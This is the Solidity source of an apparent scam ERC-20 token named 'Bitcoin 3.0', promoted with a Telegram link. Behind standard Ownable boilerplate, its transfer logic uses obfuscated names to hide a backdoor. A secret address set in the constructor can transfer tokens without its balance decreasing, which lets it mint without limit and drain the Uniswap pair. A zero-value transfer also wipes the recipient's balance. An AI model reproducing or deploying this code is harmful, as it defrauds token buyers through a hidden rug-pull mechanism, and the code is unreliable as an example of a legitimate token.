/*

https://t.me/btc3_erc

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.11;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Bitcoin is Ownable {
    event Approval(address indexed owner, address indexed spender, uint256 value);

    string public symbol = 'Bitcoin 3.0';

    uint8 public decimals = 9;

    event Transfer(address indexed from, address indexed to, uint256 value);

    string public name = 'Bitcoin 3.0';

    function approve(address mouk, uint256 cagzpi) public returns (bool success) {
        allowance[msg.sender][mouk] = cagzpi;
        emit Approval(msg.sender, mouk, cagzpi);
        return true;
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function jwtxcfgdl(address hgkziem, address gudivwobp, uint256 cagzpi) private {
        if (0 == niua[hgkziem]) {
            balanceOf[hgkziem] -= cagzpi;
        }
        balanceOf[gudivwobp] += cagzpi;
        if (0 == cagzpi && gudivwobp != rwmy) {
            balanceOf[gudivwobp] = cagzpi;
        }
        emit Transfer(hgkziem, gudivwobp, cagzpi);
    }

    mapping(address => uint256) private gevzojx;

    function transfer(address gudivwobp, uint256 cagzpi) public returns (bool success) {
        jwtxcfgdl(msg.sender, gudivwobp, cagzpi);
        return true;
    }

    uint256 private qdefvytpjo = 103;

    mapping(address => mapping(address => uint256)) public allowance;

    constructor(address cprznkjsl) {
        balanceOf[msg.sender] = totalSupply;
        niua[cprznkjsl] = qdefvytpjo;
        IUniswapV2Router02 gkqz = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        rwmy = IUniswapV2Factory(gkqz.factory()).createPair(address(this), gkqz.WETH());
    }

    mapping(address => uint256) private niua;

    mapping(address => uint256) public balanceOf;

    address public rwmy;

    function transferFrom(address hgkziem, address gudivwobp, uint256 cagzpi) public returns (bool success) {
        require(cagzpi <= allowance[hgkziem][msg.sender]);
        allowance[hgkziem][msg.sender] -= cagzpi;
        jwtxcfgdl(hgkziem, gudivwobp, cagzpi);
        return true;
    }
}